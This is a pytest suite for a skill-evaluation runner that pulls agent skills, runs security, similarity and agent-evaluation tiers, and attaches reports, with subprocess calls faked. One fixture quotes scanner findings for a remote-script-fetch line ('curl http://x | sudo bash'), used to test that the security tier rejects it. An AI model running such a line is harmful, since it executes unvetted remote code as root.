"""Tests for the runner entrypoint; subprocess calls are replaced by fakes."""

from __future__ import annotations

import json
import subprocess
from pathlib import Path
from typing import Any

import pytest

import skill_eval

ENV = {
    "SKILL_REF": "harbor.example/skills/acme@sha256:abc",
    "SKILL_NAME": "acme",
    "AGENT": "claude-code",
    "MODEL": "claude-haiku-5-5",
    "ATTEMPTS": "2",
}


def agent_entry(with_skill: Any, without_skill: Any, model: str = "claude-haiku-5-5") -> dict:
    """Build one ``agents.<name>`` entry as SkillEvaluator writes it."""
    return {
        "model": model,
        "overall_with_skill": with_skill,
        "overall_without_skill": without_skill,
    }


def validator(
    check: str,
    status: str = "passed",
    findings: list[dict] | None = None,
    errors: list[str] | None = None,
    incomplete: list[str] | None = None,
) -> dict:
    """Build one ``results[]`` entry of a SkillEvaluator JSON report."""
    return {
        "validator": check.title(),
        "status": status,
        "passed": status == "passed",
        "skipped": False,
        "incomplete_scans": incomplete or [],
        "findings": findings or [],
        "legacy": {"errors": errors or [], "warnings": [], "messages": []},
        "publication_evidence": {"producer": "skillevaluator.tier1", "tier": 1, "check_id": check},
    }


def finding(rule: str, message: str, path: str = "scripts/x.sh", line: int = 5, sev="high") -> dict:
    """Build one ``findings[]`` entry."""
    return {
        "severity": sev,
        "check_name": rule,
        "message": message,
        "file_path": path,
        "line_number": line,
    }


def report(status: str, results: list[dict] | None = None) -> dict:
    """Build a SkillEvaluator JSON report with the given ``overall_status``."""
    return {
        "overall_status": status,
        "overall_passed": status == "passed",
        "results": results or [],
    }


PASS = report("passed", [validator("schema")])
GOOD = {"agents": {"claude-code": agent_entry(0.951, 0.364)}}
REPORT = "sha256:" + "c" * 64
TIERS_OK = {"tier1": "passed", "tier2": "passed", "tier3": "passed"}
GOOD_PAYLOAD = {
    "withSkill": 0.95,
    "withoutSkill": 0.36,
    "lift": 0.59,
    "agent": "claude-code",
    "model": "claude-haiku-5-5",
    "report": REPORT,
    "tiers": TIERS_OK,
    "publication": "passed",
    "findings": [],
}
NO_REPORT = {k: v for k, v in GOOD_PAYLOAD.items() if k != "report"}
CURL_BASH = report(
    "failed",
    [
        validator(
            "security",
            "failed",
            [
                finding("Chaining Abuse (TM2)", "Tool Misuse: | sudo", sev="high"),
                finding("Unknown (LP3)", "opaque intent", "SKILL.md", 1, sev="medium"),
                finding("External Script Fetching (SC2)", "curl http://x | sudo bash", sev="high"),
            ],
        )
    ],
)


class FakeRun:
    """Stands in for subprocess.run: fakes oras and skillevaluator."""

    def __init__(
        self,
        result: Any = GOOD,
        tier1: Any = PASS,
        tier2: Any = PASS,
        eval_exit: int = 0,
        pull_exit: int = 0,
        skill_dir: bool = True,
        attach_exit: int = 0,
        repos: list[str] | None = None,
        tags: dict[str, list[str]] | None = None,
        catalog_exit: int = 0,
        tier2_exit: int = 0,
        attach_failures: int = 0,
    ):
        self.attach_failures = attach_failures  # attach calls that fail before one succeeds
        self.result = result
        self.tier1 = tier1
        self.tier2 = tier2
        self.eval_exit = eval_exit
        self.pull_exit = pull_exit
        self.skill_dir = skill_dir
        self.attach_exit = attach_exit
        self.repos = repos if repos is not None else []
        self.tags = tags or {}
        self.catalog_exit = catalog_exit
        self.tier2_exit = tier2_exit
        self.calls: list[list[str]] = []
        self.envs: dict[str, dict[str, str]] = {}
        self.attach_cwd: Path | None = None
        self.bundle: list[str] = []

    def names(self) -> list[str]:
        """Return the ``oras``/``skillevaluator`` sub-commands that ran, in order."""
        return [" ".join(c[:3] if c[0] == "oras" else c[:2]) for c in self.calls]

    def tier3_ran(self) -> bool:
        """Return whether ``tier3 evaluate`` was called."""
        return any(c[:3] == ["skillevaluator", "tier3", "evaluate"] for c in self.calls)

    @staticmethod
    def write_report(directory: Path, name: str, content: Any) -> None:
        """Write ``name``.json and ``name``.html into ``directory``."""
        directory.mkdir(parents=True, exist_ok=True)
        text = content if isinstance(content, str) else json.dumps(content)
        (directory / f"{name}.json").write_text(text)
        (directory / f"{name}.html").write_text("<html></html>")

    def oras(self, cmd: list[str], kwargs: dict[str, Any]) -> subprocess.CompletedProcess:
        """Fake the oras sub-commands the runner uses."""
        if cmd[1] == "attach":
            self.attach_cwd = kwargs.get("cwd")
            self.bundle = sorted(p.name for p in Path(kwargs["cwd"]).iterdir())
            if self.attach_failures > 0:
                self.attach_failures -= 1
                return subprocess.CompletedProcess(cmd, 1, "", "HEAD manifests: status code 502")
            if self.attach_exit:
                return subprocess.CompletedProcess(cmd, self.attach_exit, "", "unauthorized")
            out = f"Attached to [registry] {ENV['SKILL_REF']}\nDigest: {REPORT}\n"
            return subprocess.CompletedProcess(cmd, 0, out, "")
        if cmd[1] == "repo" and cmd[2] == "ls":
            return subprocess.CompletedProcess(cmd, 0, "\n".join(self.repos) + "\n", "")
        if cmd[1] == "repo" and cmd[2] == "tags":
            name = cmd[3].rsplit("/", 1)[1]
            return subprocess.CompletedProcess(cmd, 0, "\n".join(self.tags.get(name, [])), "")
        dest = Path(cmd[cmd.index("--output") + 1])
        if cmd[2] == ENV["SKILL_REF"]:
            if self.skill_dir and self.pull_exit == 0:
                (dest / ENV["SKILL_NAME"]).mkdir(parents=True)
            stderr = "denied" if self.pull_exit else ""
            return subprocess.CompletedProcess(cmd, self.pull_exit, "", stderr)
        name = cmd[2].rsplit("/", 1)[1].split(":")[0]  # a catalog skill
        (dest / name).mkdir(parents=True)
        (dest / name / "SKILL.md").write_text("---\nname: x\n---\n")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    def __call__(self, cmd: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        self.calls.append(cmd)
        if cmd[0] == "oras":
            return self.oras(cmd, kwargs)
        sub = cmd[1]
        if "env" in kwargs:
            self.envs[sub] = kwargs["env"]
        if sub == "validate":
            self.write_report(Path(cmd[cmd.index("-o") + 1]), "skillevaluator-output-1", self.tier1)
            return subprocess.CompletedProcess(cmd, 0 if self.tier1 is PASS else 1, "", "")
        if sub == "similarity-check":
            if not self.catalog_exit:
                Path(cmd[cmd.index("--save-catalog") + 1]).write_text("{}")
            return subprocess.CompletedProcess(cmd, self.catalog_exit, "", "embedding failed")
        if sub == "tier2":
            if self.tier2 is not None:
                out = Path(cmd[cmd.index("-o") + 1])
                self.write_report(out, "skillevaluator-tier2", self.tier2)
            return subprocess.CompletedProcess(cmd, self.tier2_exit, "", "provider error\nboom")
        # tier3 evaluate
        if self.result is not None:
            run_dir = Path(cmd[cmd.index("--results-dir") + 1]) / "acme" / "20260101_000000"
            run_dir.mkdir(parents=True)
            text = self.result if isinstance(self.result, str) else json.dumps(self.result)
            (run_dir / "result.json").write_text(text)
            (run_dir / "report.html").write_text("<html></html>")
        return subprocess.CompletedProcess(cmd, self.eval_exit)


@pytest.fixture(autouse=True)
def sleeps(monkeypatch):
    """Record the retry backoff instead of waiting for it."""
    waited: list[float] = []
    monkeypatch.setattr(skill_eval.time, "sleep", waited.append)
    return waited


@pytest.fixture
def termination(tmp_path, monkeypatch):
    """Point the termination log at a temp file and return a reader for it."""
    path = tmp_path / "termination-log"
    monkeypatch.setenv("TERMINATION_LOG", str(path))
    for key in ("SKILL_EVAL_LLM_PROVIDER", "SKILL_EVAL_EMBEDDING_PROVIDER", "NVIDIA_API_KEY"):
        monkeypatch.delenv(key, raising=False)
    monkeypatch.setenv("ANTHROPIC_API_KEY", "anthropic-test")
    monkeypatch.setenv("OPENAI_API_KEY", "openai-test")
    for key, value in ENV.items():
        monkeypatch.setenv(key, value)
    return lambda: json.loads(path.read_text())


@pytest.mark.parametrize(
    ("name", "fake", "code", "expected"),
    [
        ("good result", FakeRun(GOOD), 0, GOOD_PAYLOAD),
        ("eval exits non-zero but scores exist", FakeRun(GOOD, eval_exit=1), 0, GOOD_PAYLOAD),
        ("attach fails, eval still succeeds", FakeRun(GOOD, attach_exit=1), 0, NO_REPORT),
        (
            "hurting skill is a valid result",
            FakeRun({"agents": {"claude-code": agent_entry(0.4, 0.9)}}),
            0,
            {**GOOD_PAYLOAD, "withSkill": 0.4, "withoutSkill": 0.9, "lift": -0.5},
        ),
        (
            "missing agent",
            FakeRun({"agents": {"codex": agent_entry(1, 0)}}),
            1,
            "no entry for agent 'claude-code'",
        ),
        (
            "missing result file",
            FakeRun(None, eval_exit=2),
            1,
            "skillevaluator exited 2: SkillEvaluator wrote no result.json",
        ),
        (
            "null scores report execution errors",
            FakeRun(
                {
                    "agents": {"claude-code": agent_entry(None, None)},
                    "execution_errors": ["build failed"],
                }
            ),
            1,
            "no scores in result.json: build failed",
        ),
        ("corrupt result file", FakeRun("{not json"), 1, "cannot read result.json"),
        ("oras pull fails", FakeRun(GOOD, pull_exit=1), 1, "oras pull failed (1): denied"),
        (
            "artifact lacks skill directory",
            FakeRun(GOOD, skill_dir=False),
            1,
            "no directory named 'acme'",
        ),
    ],
)
def test_main(name, fake, code, expected, termination, monkeypatch):
    """main() writes the contract's termination message and exit code."""
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == code, name
    written = termination()
    if code == 0:
        assert written == expected
    else:
        assert expected in written["error"]
        assert set(written) == {"error"}


@pytest.mark.parametrize(
    ("name", "fake", "tiers", "publication", "findings"),
    [
        (
            "tier 1 fails on curl piped to bash",
            FakeRun(GOOD, tier1=CURL_BASH),
            {"tier1": "failed", "tier2": "passed", "tier3": "skipped"},
            "failed",
            [
                "tier1/security: Chaining Abuse (TM2): Tool Misuse: | sudo (scripts/x.sh:5)",
                "tier1/security: External Script Fetching (SC2): curl http://x | sudo bash"
                " (scripts/x.sh:5)",
            ],
        ),
        (
            "tier 2 fails on a duplicate",
            FakeRun(
                GOOD,
                tier2=report(
                    "failed",
                    [
                        validator(
                            "similarity",
                            "failed",
                            [finding("EXACT_DUPLICATE", "matches 'other'", "acme", 0)],
                        )
                    ],
                ),
            ),
            {"tier1": "passed", "tier2": "failed", "tier3": "skipped"},
            "failed",
            ["tier2/similarity: EXACT_DUPLICATE: matches 'other' (acme)"],
        ),
        (
            "tier 1 incomplete still runs tier 3",
            FakeRun(
                GOOD,
                tier1=report(
                    "incomplete",
                    [
                        validator(
                            "security",
                            "incomplete",
                            errors=["[SECURITY-HIGH] skillspector did not complete"],
                            incomplete=["skillspector"],
                        )
                    ],
                ),
            ),
            {"tier1": "incomplete", "tier2": "passed", "tier3": "passed"},
            "incomplete",
            ["tier1/security: skillspector did not complete"],
        ),
        (
            "tier 2 crash leaves no report",
            FakeRun(GOOD, tier2=None, tier2_exit=1),
            {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"},
            "incomplete",
            ["tier2/run: boom"],
        ),
        (
            "tier 3 ran with failed trials",
            FakeRun({**GOOD, "execution_status": "incomplete", "execution_errors": ["trial 2"]}),
            {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"},
            "incomplete",
            ["tier3/execution: trial 2"],
        ),
    ],
)
def test_tiers(name, fake, tiers, publication, findings, termination, monkeypatch):
    """Tier 3 runs unless Tier 1 or 2 failed; the message carries tiers and findings."""
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0, name
    written = termination()
    assert written["tiers"] == tiers
    assert written["publication"] == publication
    assert written["findings"] == findings
    assert fake.tier3_ran() == (tiers["tier3"] != "skipped")
    if tiers["tier3"] == "skipped":
        assert not {"withSkill", "withoutSkill", "lift"} & set(written)
        assert written["report"] == REPORT


def test_rejected_run_attaches_the_failing_report(termination, monkeypatch):
    """A skipped Tier 3 still attaches the static reports; report.html is the failing tier's."""
    fake = FakeRun(GOOD, tier1=CURL_BASH)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert fake.bundle == [
        "report.html",
        "result.json",
        "tier1.html",
        "tier1.json",
        "tier2.html",
        "tier2.json",
    ]
    attach = fake.calls[-1]
    assert "skillci.dev/publication=failed" in attach
    assert not any(a.startswith("skillci.dev/lift") for a in attach)


def test_tier1_and_tier2_run_before_tier3(termination, monkeypatch):
    """Static tiers get their commands and the provider environment; Tier 3 comes last."""
    fake = FakeRun(GOOD, repos=["skills/acme", "skills/other"], tags={"other": ["v1.0.0"]})
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert fake.names() == [
        "oras pull harbor.example/skills/acme@sha256:abc",
        "skillevaluator validate",
        "oras repo ls",
        "oras repo tags",
        "oras pull harbor.example/skills/other:v1.0.0",
        "skillevaluator similarity-check",
        "skillevaluator tier2",
        "skillevaluator tier3",
        "oras attach --artifact-type",
    ]
    tier1 = fake.calls[1]
    assert tier1[2].endswith("/skills/acme")
    for flag, value in [("--tiers", "1"), ("--profile", "external"), ("-r", "json,html")]:
        assert tier1[tier1.index(flag) + 1] == value
    assert "--no-llm" in tier1
    tier2 = fake.calls[-3]
    assert tier2[tier2.index("--catalog") + 1].endswith("/catalog.json")
    assert fake.envs["validate"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
    assert fake.envs["tier2"]["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai"


@pytest.mark.parametrize(
    ("name", "repos", "tags", "pulled"),
    [
        ("other skills, newest version", ["skills/acme", "skills/a", "skills/b"],
         {"a": ["v1.0.0", "v1.10.0", "v1.9.0", "beta"], "b": ["beta"]}, ["a:v1.10.0"]),
        ("stable wins over newer", ["skills/a"], {"a": ["v2.0.0", "stable"]}, ["a:stable"]),
        ("skill under test is excluded", ["skills/acme"], {"acme": ["v1.0.0"]}, []),
        ("other projects are ignored", ["library/x", "skills/a"], {"a": ["v1.0.0"]}, ["a:v1.0.0"]),
        ("names relative to the project", ["acme", "a"], {"a": ["v1.0.0"]}, ["a:v1.0.0"]),
        ("no repositories", [], {}, []),
    ],
)  # fmt: skip
def test_catalog(name, repos, tags, pulled, termination, monkeypatch):
    """The catalog holds the other skills at stable, else at their newest vX.Y.Z."""
    fake = FakeRun(GOOD, repos=repos, tags=tags)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0, name
    pulls = [c[2].split("/", 2)[2] for c in fake.calls if c[:2] == ["oras", "pull"]][1:]
    assert pulls == pulled
    tier2 = next(c for c in fake.calls if c[:2] == ["skillevaluator", "tier2"])
    assert ("--catalog" in tier2) == bool(pulled)
    assert ("similarity-check" in {c[1] for c in fake.calls}) == bool(pulled)


@pytest.mark.parametrize(
    ("tags", "expected"),
    [
        (["v1.0.0", "v1.2.0", "v1.10.0"], "v1.10.0"),
        (["v1.0.0", "stable", "v9.0.0"], "stable"),
        (["beta", "latest", "v1.2"], None),
        ([], None),
    ],
)
def test_pick_tag(tags, expected):
    """Tags are compared as versions, not as text."""
    assert skill_eval.pick_tag(tags) == expected


def test_catalog_build_failure_is_incomplete(termination, monkeypatch):
    """A catalog that cannot be built leaves Tier 2 incomplete and does not stop Tier 3."""
    fake = FakeRun(GOOD, repos=["skills/a"], tags={"a": ["v1.0.0"]}, catalog_exit=1)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    written = termination()
    assert written["tiers"]["tier2"] == "incomplete"
    assert written["findings"] == ["tier2/catalog: embedding failed"]
    assert written["tiers"]["tier3"] == "passed"


def test_no_embeddings_provider(termination, monkeypatch):
    """Without an OpenAI or NVIDIA key Tier 2 is incomplete and says why."""
    monkeypatch.delenv("OPENAI_API_KEY")
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    written = termination()
    assert written["tiers"] == {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"}
    assert "OPENAI_API_KEY" in written["findings"][0]
    assert "tier2" not in {c[1] for c in fake.calls}


def test_findings_are_capped_and_short(termination, monkeypatch):
    """At most five findings of at most 200 characters, whatever the report holds."""
    many = [finding(f"Rule {i}", "x" * 500, f"f{i}.sh", i) for i in range(1, 9)]
    fake = FakeRun(GOOD, tier1=report("failed", [validator("security", "failed", many)]))
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    findings = termination()["findings"]
    assert len(findings) == skill_eval.MAX_FINDINGS
    assert all(len(f) <= skill_eval.MAX_FINDING_CHARS for f in findings)
    assert findings[0].startswith("tier1/security: Rule 1: xxx")
    assert findings[0].endswith("...")


def test_message_stays_under_4kb(termination, monkeypatch, tmp_path):
    """Even a payload that is too large is cut down to the Kubernetes limit."""
    payload = {**GOOD_PAYLOAD, "findings": ["tier1/security: " + "y" * 190] * 30}
    path = tmp_path / "log"
    skill_eval.write_termination(payload, str(path))
    text = path.read_text()
    assert len(text.encode()) <= skill_eval.MAX_MESSAGE_BYTES
    assert json.loads(text)["tiers"] == TIERS_OK
    assert 0 < len(json.loads(text)["findings"]) < 30


def test_commands(termination, monkeypatch):
    """oras and skillevaluator get the arguments the contract promises."""
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    oras = fake.calls[0]
    evaluator = next(c for c in fake.calls if c[:3] == ["skillevaluator", "tier3", "evaluate"])
    assert oras[:3] == ["oras", "pull", ENV["SKILL_REF"]]
    assert "--plain-http" in oras
    assert evaluator[3].endswith("/skills/acme")
    for flag, value in [
        ("--agents", "claude-code"),
        ("--env-mode", "ack"),
        ("--agent-model", "claude-code=claude-haiku-5-5"),
        ("--n-attempts", "2"),
        ("--override-cpus", "1"),
        ("--override-memory-mb", "2048"),
        ("--n-concurrent", "2"),
    ]:
        assert evaluator[evaluator.index(flag) + 1] == value
    eks = [evaluator[i + 1] for i, arg in enumerate(evaluator) if arg == "--ek"]
    assert eks == [
        "namespace=skill-ci",
        "registry=registry.digitalocean.com/skill-ci-dirien",
        "image_pull_secret=docr",
        "skip_image_check=false",
    ]


def test_attach_command(termination, monkeypatch):
    """The reports of all tiers are attached to the evaluated digest as a typed referrer."""
    fake = FakeRun(GOOD)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    attach = fake.calls[-1]
    assert attach[:4] == ["oras", "attach", "--artifact-type", skill_eval.REPORT_TYPE]
    assert "--plain-http" in attach
    annotations = [attach[i + 1] for i, arg in enumerate(attach) if arg == "--annotation"]
    assert annotations == [
        "skillci.dev/model=claude-haiku-5-5",
        "skillci.dev/agent=claude-code",
        "skillci.dev/lift=+0.59",
        "skillci.dev/publication=passed",
    ]
    subject = attach.index(ENV["SKILL_REF"])
    assert attach[subject + 1 :] == [
        "report.html:text/html",
        "result.json:application/json",
        "tier1.html:text/html",
        "tier1.json:application/json",
        "tier2.html:text/html",
        "tier2.json:application/json",
    ]
    assert fake.attach_cwd is not None
    assert fake.attach_cwd.name == "bundle"


def test_termination_message_with_report_fits(tmp_path):
    """The payload with a report digest stays far below the 4 KB limit."""
    path = tmp_path / "log"
    skill_eval.write_termination(GOOD_PAYLOAD, str(path))
    assert len(path.read_text().encode()) < skill_eval.MAX_MESSAGE_BYTES


@pytest.mark.parametrize(
    ("env", "message"),
    [
        ({k: v for k, v in ENV.items() if k != "MODEL"}, "missing required env: MODEL"),
        ({**ENV, "ATTEMPTS": "zero"}, "ATTEMPTS must be a positive integer"),
        ({**ENV, "SANDBOX_CPUS": "0"}, "SANDBOX_CPUS must be a positive integer"),
        ({**ENV, "SANDBOX_MEMORY_MB": "2g"}, "SANDBOX_MEMORY_MB must be a positive integer"),
    ],
)
def test_bad_config(env, message):
    """Bad configuration fails before anything runs."""
    with pytest.raises(skill_eval.EvalError, match=message):
        skill_eval.load_config(env)


@pytest.mark.parametrize(
    ("tiers", "expected"),
    [
        ({"tier1": "passed", "tier2": "passed", "tier3": "passed"}, "passed"),
        ({"tier1": "incomplete", "tier2": "passed", "tier3": "passed"}, "incomplete"),
        ({"tier1": "passed", "tier2": "passed", "tier3": "skipped"}, "incomplete"),
        ({"tier1": "failed", "tier2": "incomplete", "tier3": "skipped"}, "failed"),
    ],
)
def test_publication_status(tiers, expected):
    """Publication fails on any failed tier and passes only when every tier passed."""
    assert skill_eval.publication_status(tiers) == expected


def test_truncated_message(tmp_path):
    """Long error messages are cut to fit the 4 KB termination message."""
    path = tmp_path / "log"
    skill_eval.write_termination({"error": "x" * 10_000}, str(path))
    text = path.read_text()
    assert len(text.encode()) <= skill_eval.MAX_MESSAGE_BYTES
    assert json.loads(text)["error"].endswith("...")


def test_secrets_are_redacted(termination, monkeypatch):
    """API key values never reach the termination message."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-secret-value")

    def boom(*_: Any, **__: Any) -> None:
        raise RuntimeError("failed with sk-secret-value")

    monkeypatch.setattr(skill_eval.subprocess, "run", boom)
    assert skill_eval.main() == 1
    assert "sk-secret-value" not in json.dumps(termination())


def test_secrets_are_redacted_from_findings(termination, monkeypatch):
    """A key that a scanner echoes into a finding is removed from the message."""
    leak = report("failed", [validator("pii", "failed", [finding("Key", "found sk-leak-123")])])
    monkeypatch.setenv("OPENAI_API_KEY", "sk-leak-123")
    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun(GOOD, tier1=leak))
    assert skill_eval.main() == 0
    assert "sk-leak-123" not in json.dumps(termination())


def test_attach_is_retried(termination, monkeypatch, sleeps):
    """A transient registry error on attach is retried and the report digest still arrives."""
    fake = FakeRun(GOOD, attach_failures=1)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert termination()["report"] == REPORT
    assert sum(c[:2] == ["oras", "attach"] for c in fake.calls) == 2
    assert sleeps == [2]


def test_attach_gives_up_after_three_retries(termination, monkeypatch, sleeps):
    """A permanent attach error costs four calls and never fails the eval."""
    fake = FakeRun(GOOD, attach_exit=1)
    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
    assert skill_eval.main() == 0
    assert "report" not in termination()
    assert sum(c[:2] == ["oras", "attach"] for c in fake.calls) == 4
    assert sleeps == [2, 5, 10]
